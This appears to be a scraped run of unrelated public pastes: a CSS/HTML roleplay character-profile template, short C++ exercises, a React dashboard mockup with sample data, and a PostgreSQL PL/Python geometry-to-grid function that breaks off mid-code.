 position: absolute;
 top: 5px;
 left: 685px; 
 height: 335px; 
 width: 200px; 
 padding: 5px; 
 text-align: left; 
 font-family: economica; 
 font-size: 13px; 
 overflow: auto; 
 color: #FEFEFE; 
 background-color: #000;
 border-outline: 1px solid #000;
 filter:drop-shadow(0px 0px 2px #000);
 z-index: 999;}

 h1 { letter-spacing: 0px; font-family: new; color: #999999; font-weight: bold; font-size:18px; text-transform: uppercase; filter:drop-shadow(0px 0px 2px #999999);}

 b { letter-spacing: 0px; font-family: economica; color: #999999; font-weight: bold; font-size:14px; text-transform: uppercase; filter:drop-shadow(0px 0px 2px #999999);}

 i { letter-spacing: 1px; font-family: economica; color: #777777; font-weight: bold; font-size:14px; text-transform:; filter:drop-shadow(0px 0px 1px #777777);}

 u { letter-spacing: 1px; font-family: economica; color: #555555; font-weight: bold; font-size:13px; text-transform:; filter:drop-shadow(0px 0px 1px #555555);}

 s { letter-spacing: 1px; font-family: economica; color: #333333; font-weight: bold; font-size:13px; text-transform:; filter:drop-shadow(0px 0px 1px #333333);}

 strong { letter-spacing: 1px; font-family: economica; color: #777777; font-weight: bold; font-size:14px; text-transform:; filter:drop-shadow(0px 0px 1px #777777);}

 a { font-family: economica; letter-spacing: 0px; color: #FEFEFE; font-size: 14px; font-weight: bold; text-decoration: none; text-transform: uppercase; transition: 0.7s; 
 cursor: url(https://i.imgur.com/WIeMSiR.png), auto; filter:drop-shadow(0px 0px 1px #FEFEFE);}

 a:hover { font-family: economica; letter-spacing: 0px; color: #999999; font-size: 14px; font-weight: bold; text-decoration: none; text-transform: uppercase; transition:0.7s;
 cursor: url(https://i.imgur.com/WIeMSiR.png), auto; filter:drop-shadow(0px 0px 1px #999999);}

.contacts {
 position: absolute;
 top: 10px;
 left: 600px; 
 height: 335px; 
 width: 75px; 
 padding: 0px; 
 text-align: center; 
 font-family: economica; 
 font-size: 13px; 
 overflow: auto; 
 color: #FEFEFE; 
 background-color: transparent;
 border-outline: 1px solid #000;
 filter:drop-shadow(0px 0px 3px #000);
 z-index: 999;}

.fr1 {width: 75px; height: 75px; margin-bottom: 3px; margin-top: 5px; margin-right: 0px; margin-left: 0px; border: 0px solid #000; border-radius: 0px; z-index: 999;}

 #music-bg { position:absolute; background-color: #000; left:380px; top:355px; width:auto; height:19; opacity:1; }
 
 #music{ position:absolute; background-image: url('https://i.imgur.com/N3ScMZd.png'); background-repeat: no-repeat; background-size: 10px; width:500px; height:19px; z-index:99; left:6; top:4; -webkit-transition: all 0.5s ease-in-out; -moz-transition: all 0.5s ease-in-out; -o-transition: all 0.5s ease-in-out; }
 
 #music-title-bg { position:absolute; background-color:#000; width:auto; height:19; left:25; top:-0; }
 
 #music-title-bg2 { position:absolute; background-color: #000; width:490; height:19px; left:0; top:0; }
 
 #music-title { position:absolute; color:#FFF; font-family:economica; font-size:13px; text-transform:uppercase; text-align:justify; width:485; left:0; top:3; }


</style>

<div class=""wilder"">
<a target=""_blank"" href=""https://roleplay.chat/profile.php?user=WILDER"" title=""code by wilder."">
<img src=""https://i.imgur.com/hCJmFVu.png"" width=""75px;""></a>
</div>

<div class=""container"">

<div class=""image1""></div>

<div class=""title1"">title here</div>

<div class=""words1"">
<div id=""01"" class=""put"">
 
<table border=""0"" cellspacing=""-10"">
 
<tr>
<td><b>Name</b></td>
<td>
<p class=""td"">Name</p>
</td>
</tr>

<tr>
<td><b>Nicknames</b></td>
<td>
<p class=""td"">Nicknames</p>
</td>
</tr>

<tr>
<td><b>Socials</b></td>
<td>
<p class=""td""><a title=""Details."">@socials</a></p>
</td>
</tr>

<tr>
<td><b>Birthdate</b></td>
<td>
<p class=""td"">Birthday <b>/</b> Age</p>
</td>
</tr>

<tr>
<td><b>Birth Place</b></td>
<td>
<p class=""td"">Birth Place</p>
</td>
</tr><br>

<tr>
<td><b>Residence</b></td>
<td>
<p class=""td"">Residence</p>
</td>
</tr>

<tr>
<td><b>Occupation</b></td>
<td>
<p class=""td"">Occupation</p>
</td>
</tr>

<tr>
<td><b>Orientation</b></td>
<td>
<p class=""td"">Orientation</p>
</td>
</tr>

<tr>
<td><b>Marital</b></td>
<td>
<p class=""td""><a target=""_blank"" href=""https://roleplay.chat/profile.php?user="" title=""Details."">Marital</a></p>
</td>
</tr>

<tr>
<td><b>Alumni</b></td>
<td>
<p class=""td"">House <b>/</b> Year</p>
</td>
</tr>

<tr>
<td><b>Wand</b></td>
<td>
<p class=""td"">Length, Wood, Core, Flexibility</p>
</td>
</tr>

<tr>
<td><b>Patronus</b></td>
<td>
<p class=""td""><a target=""_blank"" title=""Details."">Patronus</a></p>
</td>
</tr>

<tr>
<td><b>Boggart</b></td>
<td>
<p class=""td"">Boggart</p>
</td>
</tr>

<tr>
<td><b>Amortentia</b></td>
<td>
<p class=""td"">Amortentia</p>
</td>
</tr>

<tr>
<td><b>Blood</b></td>
<td>
<p class=""td"">Blood Status</p>
</td>
</tr>

<tr>
<td><b>Ethnicity</b></td>
<td>
<p class=""td"">Ethnicity</p>
</td>
</tr>

<tr>
<td><b>Hair</b></td>
<td>
<p class=""td"">Hair</p>
</td>
</tr>

<tr>
<td><b>Eyes</b></td>
<td>
<p class=""td"">Eyes</p>
</td>
</tr>

<tr>
<td><b>Height</b></td>
<td>
<p class=""td"">0'0"" <b>/</b> 000cm</p>
</td>
</tr>
 
<tr>
<td><b>Weight</b></td>
<td>
<p class=""td"">000lbs <b>/</b> 00kg</p>
</td>
</tr> 
 
<tr>
<td><b>Build</b></td>
<td>
<p class=""td"">Physique</p>
</td>
</tr>

<tr>
<td><b>Notable</b></td>
<td>
<p class=""td""><a target=""_blank"" title=""Details."">Scars</a> <b>/</b> <a target=""_blank"" title=""Details."">Tattoos</a></p>
</td>
</tr>

<tr>
<td><b>Scent</b></td>
<td>
<p class=""td""><a target=""_blank"" title=""Details."">Scent</a></p>
</td>
</tr>

</table>
</div>
</div>

<div class=""words2"">

 <b>❝</b> Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis molestie efficitur gravida. Nunc eget nulla non nibh mollis sollicitudin. Aliquam at ornare ligula, ac sollicitudin. <br><br>

 <b>❝</b> Aenean sit amet orci nec nisl auctor vulputate sed ut est. Nulla aliquet tempor sem nec scelerisque. Aliquam erat volutpat. Curabitur posuere tellus ultricies risus eleifend. <br><br>

 <b>❝</b> Proin dignissim ultrices risus id congue. Morbi aliquet erat augue, eget aliquet mauris pellentesque vitae. Donec pellentesque tellus id tellus imperdiet ultricies. Vestibulum pharetra ante nec ligula laoreet, a fringilla leo facilisis. <br><br>

 <b>❝</b> Pellentesque eget libero sed est fermentum elementum sit amet ut leo. <br><br>

 <b>bold</b> <i>italic</i> <strong>strong</strong> <u>underline</u> <s>strike</s> <a>link</a>

</div>

<div class=""contacts"">

 <a target=""_blank"" href=""https://roleplay.chat/profile.php?user=""><img src=""https://placehold.co/75x75/999999/000000.png"" style=""filter:grayscale(100%) brightness(100%); opacity:1"" class=""fr1"" title=""Details.""></a>

 <a target=""_blank"" href=""https://roleplay.chat/profile.php?user=""><img src=""https://placehold.co/75x75/999999/000000.png"" style=""filter:grayscale(100%) brightness(100%); opacity:1"" class=""fr1"" title=""Details.""></a>

 <a target=""_blank"" href=""https://roleplay.chat/profile.php?user=""><img src=""https://placehold.co/75x75/999999/000000.png"" style=""filter:grayscale(100%) brightness(100%); opacity:1"" class=""fr1"" title=""Details.""></a>

 <a target=""_blank"" href=""https://roleplay.chat/profile.php?user=""><img src=""https://placehold.co/75x75/999999/000000.png"" style=""filter:grayscale(100%) brightness(100%); opacity:1"" class=""fr1"" title=""Details.""></a>

 <a target=""_blank"" href=""https://roleplay.chat/profile.php?user=""><img src=""https://placehold.co/75x75/999999/000000.png"" style=""filter:grayscale(100%) brightness(100%); opacity:1"" class=""fr1"" title=""Details.""></a>

 <a target=""_blank"" href=""https://roleplay.chat/profile.php?user=""><img src=""https://placehold.co/75x75/999999/000000.png"" style=""filter:grayscale(100%) brightness(100%); opacity:1"" class=""fr1"" title=""Details.""></a>

 <a target=""_blank"" href=""https://roleplay.chat/profile.php?user=""><img src=""https://placehold.co/75x75/999999/000000.png"" style=""filter:grayscale(100%) brightness(100%); opacity:1"" class=""fr1"" title=""Details.""></a>

</div>

<div id=""music-bg"">
<div id=""music"">
<div style=""margin-top:-10px; margin-left:-10px;"">
<audio controls style=""opacity:0; width:100px; margin-top:-10px; margin-left:-10px;"">
<source src=""MUSIC_LINK"">
</audio>
</div>
</div>
 
<div id=""music-title-bg"">
<div id=""music-title-bg2"">
<div id=""music-title"">
<marquee direction=""left"" scrollamount=""4"">

 Put whatever you want in here. Lyrics? Go for it. OOC? Sure. Whatever you want, I don't care.

</marquee>
</div>
</div>
</div>
</div>

</div>"
0DUbdkEc,Untitled,Josif_tepe,C++,Sunday 23rd of March 2025 11:20:47 AM CDT,"#include <iostream>
using namespace std;

int presmetaj() {
    return 5;
}

int main() {
    int x = presmetaj();
    
    cout << x << endl;
    
    return 0;
}
"
JAcPvfq4,Untitled,Josif_tepe,C++,Sunday 23rd of March 2025 11:16:14 AM CDT,"#include <iostream>
using namespace std;

void pechati() {
    cout << ""Hello"" << endl;
}

int main() {
    pechati();
    
    return 0;
}
"
gsUPEpEC,Dashboard,Abhisek92,HTML,Sunday 23rd of March 2025 11:08:42 AM CDT,"import React, { useState } from 'react';
import { AlertCircle, CheckCircle, FileText, Mail, ChevronRight, Upload, Inbox, FileDown, ArrowRightCircle, Settings, Filter, Clock } from 'lucide-react';

const Dashboard = () => {
  const [activeTab, setActiveTab] = useState('overview');
  
  // Sample data for demonstration
  const stats = {
    documentsProcessed: 247,
    emailsTriaged: 183,
    validationRules: 56,
    pendingReview: 12,
    automatedFixes: 143
  };
  
  const recentDocuments = [
    { id: 1, name: 'Quarterly Compliance Report.pdf', type: 'Regulatory', priority: 'High', status: 'Validated', timestamp: '2025-03-22 09:23:15' },
    { id: 2, name: 'Customer Data Breach Report.docx', type: 'Incident', priority: 'Critical', status: 'Needs Review', timestamp: '2025-03-22 11:47:32' },
    { id: 3, name: 'Annual Risk Assessment.xlsx', type: 'Financial', priority: 'Medium', status: 'Processing', timestamp: '2025-03-21 16:08:45' },
    { id: 4, name: 'GDPR Regulatory Update.pdf', type: 'Regulatory', priority: 'High', status: 'Routed', timestamp: '2025-03-21 14:30:11' },
    { id: 5, name: 'Transaction Error Log.csv', type: 'Error Report', priority: 'Medium', status: 'Validated', timestamp: '2025-03-21 10:15:27' }
  ];
  
  const validationIssues = [
    { id: 1, rule: 'Customer ID Format', severity: 'High', affectedDocs: 3, status: 'Remediated', timestamp: '2025-03-22 08:45:12' },
    { id: 2, rule: 'Transaction Amount Range', severity: 'Critical', affectedDocs: 7, status: 'Pending Review', timestamp: '2025-03-22 09:23:05' },
    { id: 3, rule: 'Missing Required Fields', severity: 'Medium', affectedDocs: 12, status: 'Remediated', timestamp: '2025-03-21 15:37:41' },
    { id: 4, rule: 'Date Format Inconsistency', severity: 'Low', affectedDocs: 28, status: 'Automated Fix', timestamp: '2025-03-21 11:52:18' },
    { id: 5, rule: 'Cross-validation Failure', severity: 'High', affectedDocs: 4, status: 'Manual Review', timestamp: '2025-03-20 16:20:33' }
  ];
  
  const getStatusColor = (status) => {
    switch (status.toLowerCase()) {
      case 'validated':
      case 'remediated':
      case 'automated fix':
        return 'bg-green-100 text-green-800';
      case 'needs review':
      case 'pending review':
      case 'manual review':
        return 'bg-yellow-100 text-yellow-800';
      case 'processing':
      case 'routed':
        return 'bg-blue-100 text-blue-800';
      default:
        return 'bg-gray-100 text-gray-800';
    }
  };
  
  const getSeverityColor = (severity) => {
    switch (severity.toLowerCase()) {
      case 'critical':
        return 'bg-red-100 text-red-800';
      case 'high':
        return 'bg-orange-100 text-orange-800';
      case 'medium':
        return 'bg-yellow-100 text-yellow-800';
      case 'low':
        return 'bg-blue-100 text-blue-800';
      default:
        return 'bg-gray-100 text-gray-800';
    }
  };
  
  return (
    <div className=""flex h-screen bg-gray-50"">
      {/* Sidebar */}
      <div className=""w-64 bg-indigo-800 text-white"">
        <div className=""p-4"">
          <h1 className=""text-xl font-bold"">AI Orchestrator</h1>
          <p className=""text-xs text-indigo-200 mt-1"">Data Profiling & Routing</p>
        </div>
        
        <nav className=""mt-6"">
          <a 
            href=""#overview"" 
            onClick={() => setActiveTab('overview')}
            className={`flex items-center px-4 py-3 ${activeTab === 'overview' ? 'bg-indigo-900' : 'hover:bg-indigo-700'}`}
          >
            <Inbox className=""w-5 h-5 mr-3"" />
            <span>Overview</span>
          </a>
          
          <a 
            href=""#documents"" 
            onClick={() => setActiveTab('documents')}
            className={`flex items-center px-4 py-3 ${activeTab === 'documents' ? 'bg-indigo-900' : 'hover:bg-indigo-700'}`}
          >
            <FileText className=""w-5 h-5 mr-3"" />
            <span>Documents</span>
          </a>
          
          <a 
            href=""#emails"" 
            onClick={() => setActiveTab('emails')}
            className={`flex items-center px-4 py-3 ${activeTab === 'emails' ? 'bg-indigo-900' : 'hover:bg-indigo-700'}`}
          >
            <Mail className=""w-5 h-5 mr-3"" />
            <span>Emails</span>
          </a>
          
          <a 
            href=""#validation"" 
            onClick={() => setActiveTab('validation')}
            className={`flex items-center px-4 py-3 ${activeTab === 'validation' ? 'bg-indigo-900' : 'hover:bg-indigo-700'}`}
          >
            <CheckCircle className=""w-5 h-5 mr-3"" />
            <span>Validation</span>
          </a>
          
          <a 
            href=""#settings"" 
            onClick={() => setActiveTab('settings')}
            className={`flex items-center px-4 py-3 ${activeTab === 'settings' ? 'bg-indigo-900' : 'hover:bg-indigo-700'}`}
          >
            <Settings className=""w-5 h-5 mr-3"" />
            <span>Settings</span>
          </a>
        </nav>
      </div>
      
      {/* Main content */}
      <div className=""flex-1 overflow-y-auto"">
        {activeTab === 'overview' && (
          <div className=""p-8"">
            <div className=""flex items-center justify-between mb-8"">
              <h2 className=""text-2xl font-bold text-gray-800"">Dashboard Overview</h2>
              <div className=""flex space-x-4"">
                <button className=""px-4 py-2 bg-indigo-600 text-white rounded-md flex items-center"">
                  <Upload className=""w-4 h-4 mr-2"" />
                  Upload Documents
                </button>
                <button className=""px-4 py-2 bg-white border border-gray-300 text-gray-700 rounded-md flex items-center"">
                  <Filter className=""w-4 h-4 mr-2"" />
                  Filters
                </button>
              </div>
            </div>
            
            {/* Stats cards */}
            <div className=""grid grid-cols-1 md:grid-cols-3 lg:grid-cols-5 gap-6 mb-8"">
              <div className=""bg-white p-6 rounded-lg shadow-sm border border-gray-100"">
                <div className=""flex items-center justify-between"">
                  <div>
                    <p className=""text-sm text-gray-500 mb-1"">Documents Processed</p>
                    <h3 className=""text-2xl font-bold text-gray-800"">{stats.documentsProcessed}</h3>
                  </div>
                  <div className=""p-3 rounded-full bg-indigo-100 text-indigo-600"">
                    <FileText className=""w-6 h-6"" />
                  </div>
                </div>
              </div>
              
              <div className=""bg-white p-6 rounded-lg shadow-sm border border-gray-100"">
                <div className=""flex items-center justify-between"">
                  <div>
                    <p className=""text-sm text-gray-500 mb-1"">Emails Triaged</p>
                    <h3 className=""text-2xl font-bold text-gray-800"">{stats.emailsTriaged}</h3>
                  </div>
                  <div className=""p-3 rounded-full bg-blue-100 text-blue-600"">
                    <Mail className=""w-6 h-6"" />
                  </div>
                </div>
              </div>
              
              <div className=""bg-white p-6 rounded-lg shadow-sm border border-gray-100"">
                <div className=""flex items-center justify-between"">
                  <div>
                    <p className=""text-sm text-gray-500 mb-1"">Validation Rules</p>
                    <h3 className=""text-2xl font-bold text-gray-800"">{stats.validationRules}</h3>
                  </div>
                  <div className=""p-3 rounded-full bg-green-100 text-green-600"">
                    <CheckCircle className=""w-6 h-6"" />
                  </div>
                </div>
              </div>
              
              <div className=""bg-white p-6 rounded-lg shadow-sm border border-gray-100"">
                <div className=""flex items-center justify-between"">
                  <div>
                    <p className=""text-sm text-gray-500 mb-1"">Pending Review</p>
                    <h3 className=""text-2xl font-bold text-gray-800"">{stats.pendingReview}</h3>
                  </div>
                  <div className=""p-3 rounded-full bg-yellow-100 text-yellow-600"">
                    <Clock className=""w-6 h-6"" />
                  </div>
                </div>
              </div>
              
              <div className=""bg-white p-6 rounded-lg shadow-sm border border-gray-100"">
                <div className=""flex items-center justify-between"">
                  <div>
                    <p className=""text-sm text-gray-500 mb-1"">Automated Fixes</p>
                    <h3 className=""text-2xl font-bold text-gray-800"">{stats.automatedFixes}</h3>
                  </div>
                  <div className=""p-3 rounded-full bg-purple-100 text-purple-600"">
                    <ArrowRightCircle className=""w-6 h-6"" />
                  </div>
                </div>
              </div>
            </div>
            
            {/* Recent documents */}
            <div className=""bg-white rounded-lg shadow-sm border border-gray-100 mb-8"">
              <div className=""px-6 py-4 border-b border-gray-100 flex justify-between items-center"">
                <h3 className=""font-semibold text-gray-800"">Recent Documents</h3>
                <a href=""#"" className=""text-sm text-indigo-600 hover:text-indigo-800 flex items-center"">
                  View All
                  <ChevronRight className=""w-4 h-4 ml-1"" />
                </a>
              </div>
              <div className=""divide-y divide-gray-100"">
                {recentDocuments.map(doc => (
                  <div key={doc.id} className=""px-6 py-4 flex items-center justify-between"">
                    <div className=""flex items-center"">
                      <div className=""p-2 rounded-md bg-gray-100 mr-4"">
                        <FileText className=""w-5 h-5 text-gray-500"" />
                      </div>
                      <div>
                        <h4 className=""text-sm font-medium text-gray-800"">{doc.name}</h4>
                        <p className=""text-xs text-gray-500"">{doc.timestamp}</p>
                      </div>
                    </div>
                    <div className=""flex items-center space-x-3"">
                      <span className={`text-xs px-2 py-1 rounded-full ${getStatusColor(doc.status)}`}>
                        {doc.status}
                      </span>
                      <button className=""text-gray-400 hover:text-indigo-600"">
                        <ArrowRightCircle className=""w-4 h-4"" />
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            </div>
            
            {/* Validation Issues */}
            <div className=""bg-white rounded-lg shadow-sm border border-gray-100"">
              <div className=""px-6 py-4 border-b border-gray-100 flex justify-between items-center"">
                <h3 className=""font-semibold text-gray-800"">Recent Validation Issues</h3>
                <a href=""#"" className=""text-sm text-indigo-600 hover:text-indigo-800 flex items-center"">
                  View All
                  <ChevronRight className=""w-4 h-4 ml-1"" />
                </a>
              </div>
              <div className=""divide-y divide-gray-100"">
                {validationIssues.map(issue => (
                  <div key={issue.id} className=""px-6 py-4 flex items-center justify-between"">
                    <div className=""flex items-center"">
                      <div className=""p-2 rounded-md bg-red-50 mr-4"">
                        <AlertCircle className=""w-5 h-5 text-red-500"" />
                      </div>
                      <div>
                        <h4 className=""text-sm font-medium text-gray-800"">{issue.rule}</h4>
                        <p className=""text-xs text-gray-500"">{issue.timestamp}</p>
                      </div>
                    </div>
                    <div className=""flex items-center space-x-3"">
                      <span className={`text-xs px-2 py-1 rounded-full ${getSeverityColor(issue.severity)}`}>
                        {issue.severity}
                      </span>
                      <span className={`text-xs px-2 py-1 rounded-full ${getStatusColor(issue.status)}`}>
                        {issue.status}
                      </span>
                      <button className=""text-gray-400 hover:text-indigo-600"">
                        <ArrowRightCircle className=""w-4 h-4"" />
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}
        
        {activeTab === 'validation' && (
          <div className=""p-8"">
            <div className=""flex items-center justify-between mb-8"">
              <h2 className=""text-2xl font-bold text-gray-800"">Validation Rules & Issues</h2>
              <div className=""flex space-x-4"">
                <button className=""px-4 py-2 bg-indigo-600 text-white rounded-md flex items-center"">
                  <FileDown className=""w-4 h-4 mr-2"" />
                  Export Report
                </button>
              </div>
            </div>
            
            <div className=""bg-white rounded-lg shadow-sm border border-gray-100 mb-8"">
              <div className=""px-6 py-4 border-b border-gray-100"">
                <h3 className=""font-semibold text-gray-800"">Active Validation Rules</h3>
              </div>
              <div className=""p-6"">
                <table className=""min-w-full divide-y divide-gray-200"">
                  <thead>
                    <tr>
                      <th className=""px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider"">Rule ID</th>
                      <th className=""px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider"">Description</th>
                      <th className=""px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider"">Field(s)</th>
                      <th className=""px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider"">Type</th>
                      <th className=""px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider"">Severity</th>
                      <th className=""px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider"">Actions</th>
                    </tr>
                  </thead>
                  <tbody className=""bg-white divide-y divide-gray-200"">
                    <tr>
                      <td className=""px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900"">VR-001</td>
                      <td className=""px-6 py-4 whitespace-nowrap text-sm text-gray-500"">Customer ID must be 10 digits</td>
                      <td className=""px-6 py-4 whitespace-nowrap text-sm text-gray-500"">customer_id</td>
                      <td className=""px-6 py-4 whitespace-nowrap text-sm text-gray-500"">Format Check</td>
                      <td className=""px-6 py-4 whitespace-nowrap"">
                        <span className=""px-2 py-1 text-xs rounded-full bg-orange-100 text-orange-800"">High</span>
                      </td>
                      <td className=""px-6 py-4 whitespace-nowrap text-sm font-medium"">
                        <a href=""#"" className=""text-indigo-600 hover:text-indigo-900"">Edit</a>
                      </td>
                    </tr>
                    <tr>
                      <td className=""px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900"">VR-002</td>
                      <td className=""px-6 py-4 whitespace-nowrap text-sm text-gray-500"">Transaction amount must be positive</td>
                      <td className=""px-6 py-4 whitespace-nowrap text-sm text-gray-500"">amount</td>
                      <td className=""px-6 py-4 whitespace-nowrap text-sm text-gray-500"">Range Check</td>
                      <td className=""px-6 py-4 whitespace-nowrap"">
                        <span className=""px-2 py-1 text-xs rounded-full bg-red-100 text-red-800"">Critical</span>
                      </td>
                      <td className=""px-6 py-4 whitespace-nowrap text-sm font-medium"">
                        <a href=""#"" className=""text-indigo-600 hover:text-indigo-900"">Edit</a>
                      </td>
                    </tr>
                    <tr>
                      <td className=""px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900"">VR-003</td>
                      <td className=""px-6 py-4 whitespace-nowrap text-sm text-gray-500"">Required fields must not be empty</td>
                      <td className=""px-6 py-4 whitespace-nowrap text-sm text-gray-500"">name, email, address</td>
                      <td className=""px-6 py-4 whitespace-nowrap text-sm text-gray-500"">Not Null Check</td>
                      <td className=""px-6 py-4 whitespace-nowrap"">
                        <span className=""px-2 py-1 text-xs rounded-full bg-yellow-100 text-yellow-800"">Medium</span>
                      </td>
                      <td className=""px-6 py-4 whitespace-nowrap text-sm font-medium"">
                        <a href=""#"" className=""text-indigo-600 hover:text-indigo-900"">Edit</a>
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </div>
            
            <div className=""grid grid-cols-1 md:grid-cols-2 gap-8"">
              <div className=""bg-white rounded-lg shadow-sm border border-gray-100"">
                <div className=""px-6 py-4 border-b border-gray-100"">
                  <h3 className=""font-semibold text-gray-800"">Validation Status</h3>
                </div>
                <div className=""p-6"">
                  <div className=""flex flex-col"">
                    <div className=""flex items-center justify-between mb-4"">
                      <div className=""text-sm text-gray-500"">Total Rules</div>
                      <div className=""font-medium text-gray-900"">56</div>
                    </div>
                    <div className=""flex items-center justify-between mb-4"">
                      <div className=""text-sm text-gray-500"">Passing</div>
                      <div className=""font-medium text-green-600"">42 (75%)</div>
                    </div>
                    <div className=""flex items-center justify-between mb-4"">
                      <div className=""text-sm text-gray-500"">Failed</div>
                      <div className=""font-medium text-red-600"">14 (25%)</div>
                    </div>
                    <div className=""flex items-center justify-between mb-4"">
                      <div className=""text-sm text-gray-500"">Automated Fixes</div>
                      <div className=""font-medium text-gray-900"">9</div>
                    </div>
                    <div className=""flex items-center justify-between"">
                      <div className=""text-sm text-gray-500"">Manual Review Required</div>
                      <div className=""font-medium text-gray-900"">5</div>
                    </div>
                  </div>
                </div>
              </div>
              
              <div className=""bg-white rounded-lg shadow-sm border border-gray-100"">
                <div className=""px-6 py-4 border-b border-gray-100"">
                  <h3 className=""font-semibold text-gray-800"">Recent Remediation Actions</h3>
                </div>
                <div className=""p-6"">
                  <div className=""space-y-4"">
                    <div className=""p-4 bg-green-50 rounded-md border border-green-100"">
                      <div className=""flex items-center"">
                        <CheckCircle className=""w-5 h-5 text-green-500 mr-2"" />
                        <h4 className=""text-sm font-medium text-gray-800"">Auto-fixed: Date Format Standardization</h4>
                      </div>
                      <p className=""mt-2 text-xs text-gray-500"">28 records updated to ISO date format</p>
                      <p className=""mt-1 text-xs text-gray-400"">2025-03-21 11:52:18</p>
                    </div>
                    
                    <div className=""p-4 bg-green-50 rounded-md border border-green-100"">
                      <div className=""flex items-center"">
                        <CheckCircle className=""w-5 h-5 text-green-500 mr-2"" />
                        <h4 className=""text-sm font-medium text-gray-800"">Auto-fixed: Missing Required Fields</h4>
                      </div>
                      <p className=""mt-2 text-xs text-gray-500"">12 records updated with default values</p>
                      <p className=""mt-1 text-xs text-gray-400"">2025-03-21 15:37:41</p>
                    </div>
                    
                    <div className=""p-4 bg-yellow-50 rounded-md border border-yellow-100"">
                      <div className=""flex items-center"">
                        <AlertCircle className=""w-5 h-5 text-yellow-500 mr-2"" />
                        <h4 className=""text-sm font-medium text-gray-800"">Manual Review: Transaction Amount Range</h4>
                      </div>
                      <p className=""mt-2 text-xs text-gray-500"">7 records flagged for manual review</p>
                      <p className=""mt-1 text-xs text-gray-400"">2025-03-22 09:23:05</p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}
        
        {activeTab === 'documents' && (
          <div className=""p-8"">
            <h2 className=""text-2xl font-bold text-gray-800 mb-8"">Document Management</h2>
            <p className=""text-gray-600"">Document processing view would be displayed here.</p>
          </div>
        )}
        
        {activeTab === 'emails' && (
          <div className=""p-8"">
            <h2 className=""text-2xl font-bold text-gray-800 mb-8"">Email Triage</h2>
            <p className=""text-gray-600"">Email triage and routing view would be displayed here.</p>
          </div>
        )}
        
        {activeTab === 'settings' && (
          <div className=""p-8"">
            <h2 className=""text-2xl font-bold text-gray-800 mb-8"">System Settings</h2>
            <p className=""text-gray-600"">Settings and configuration view would be displayed here.</p>
          </div>
        )}
      </div>
    </div>
  );
};

export default Dashboard;"
4YvyhSbM,Другий семестр. Лабораторна робота №9-10 (Завдання 1),Lavig,C++,Sunday 23rd of March 2025 10:59:58 AM CDT,"#include <iostream>
#include <fstream>
#include <windows.h>

using namespace std;

int main()
{
    int number{};
    SetConsoleOutputCP(1251);
    SetConsoleCP(1251);
    ifstream input_file;
    ofstream output_file;
    input_file.open(""D:\\files\\f.txt"", ios::in);
    if (!input_file) {
        cout << ""Файлу, з якого мають зчитуватися числа, не існує!"";
        return 0;
    }
    output_file.open(""D:\\files\\g.txt"", ios::out);
    if (!output_file) {
        cout << ""Файлу, в який мають записуватися числа, не існує!"";
        return 0;
    }
    while (!input_file.eof()) {
        input_file >> number;
        if (number % 2 == 0) {
            output_file << number << ""\n"";
        }
    }
    cout << ""Запис парних чисел до нового файлу пройшов успішно!"";
}"
JktMAmBc,Untitled,aghoshpro,PostgreSQL,Sunday 23rd of March 2025 10:51:51 AM CDT,"-- FUNCTION: rasdaman_op.geo2gridX(text, double precision, double precision, double precision, double precision)

CREATE OR REPLACE FUNCTION rasdaman_op.geo2grid_final(
	""geoPOLY"" text,
	min_lon double precision,
	max_lat double precision,
	resolution_lon double precision,
	resolution_lat double precision,
	OUT ""gridPOLY"" text)
    RETURNS text
    LANGUAGE 'plpython3u'
    COST 100
    VOLATILE PARALLEL UNSAFE
AS $BODY$
import numpy as np
import re
from affine import Affine
from shapely.geometry import Polygon, LinearRing, MultiPolygon
from shapely.ops import unary_union
from shapely import wkt

def grid2WKT_ring(y_grid, x_grid):
    coordinates = list(zip(y_grid, x_grid))
    if coordinates[0] != coordinates[-1]:
        coordinates.append(coordinates[0])
    ring_wkt = ""LINEARRING("" + "", "".join(f""{x} {y}"" for x, y in coordinates) + "")""
    return ring_wkt

def grid2WKT_polygon(y_grid, x_grid):
    coordinates = list(zip(y_grid, x_grid))
    if coordinates[0] != coordinates[-1]:
        coordinates.append(coordinates[0])
    polygon_wkt = ""POLYGON(("" + "", "".join(f""{x} {y}"" for x, y in coordinates) + ""))""
    return polygon_wkt

def geo2grid(lons, lats, xmin, ymax, x_scale, y_scale, xskew = 0.0, yskew = 0.0):
    aff_gdal = Affine.from_gdal(xmin, x_scale, xskew, ymax, 0.0, -y_scale)
    lons = np.array(lons)
    lats = np.array(lats)
    xs, ys = ~aff_gdal*(lons, lats)
    xs = np.int64(xs)
    ys = np.int64(ys)
    return xs, ys 

def process_boundary(boundary):
    coords = np.dstack(boundary.xy).tolist()[0]
    coordinates = [{""long"": x, ""lat"": y} for x, y in coords]
    
    lat_arr = []
    long_arr = []
    for coord in coordinates:
        long_arr = np.append(long_arr, coord['long'])
        lat_arr = np.append(lat_arr, coord['lat'])

    long_list = long_arr.tolist()
    lat_list = lat_arr.tolist()

    x_grid, y_grid = geo2grid(long_list, lat_list, xmin, ymax, x_scale, y_scale)
    return x_grid, y_grid

def processPOLYGON(inputPOLYGON):
    if inputPOLYGON.area == 0:
        return None
    
    ext_x_grid, ext_y_grid = process_boundary(inputPOLYGON.exterior)
    
    if len(inputPOLYGON.interiors) == 0:
        gridPOLYGON_wkt = grid2WKT_polygon(ext_y_grid, ext_x_grid)
        return gridPOLYGON_wkt
    
    else:
        ext_coordinates = list(zip(ext_x_grid, ext_y_grid))
        if ext_coordinates[0] != ext_coordinates[-1]:
            ext_x_grid = np.append(ext_x_grid, ext_x_grid[0])
            ext_y_grid = np.append(ext_y_grid, ext_y_grid[0])
            
        rings_wkt = ""POLYGON(("" + "", "".join(f""{x} {y}"" for x, y in zip(ext_x_grid, ext_y_grid)) + "")""
        
